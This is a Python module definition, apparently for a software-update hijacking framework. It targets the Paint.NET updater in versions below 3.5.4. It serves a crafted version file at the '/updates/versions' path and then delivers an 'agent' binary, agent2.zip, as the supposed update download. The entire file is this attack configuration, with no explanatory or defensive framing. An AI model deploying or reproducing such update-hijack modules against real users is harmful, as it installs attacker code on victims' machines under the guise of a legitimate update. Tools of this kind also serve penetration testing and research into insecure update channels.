from modules import ModuleBase


class paintnet(ModuleBase):
    name = 'paintnet'
    version = '1.0'
    appver = '< 3.5.4'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.getpaint.net)'
    agent_filename = './agent/agent2.zip'
    requests = [{
            'path': '/updates/versions',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/paintnet/version',
        }, {
            'path': '.zip',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
    }]
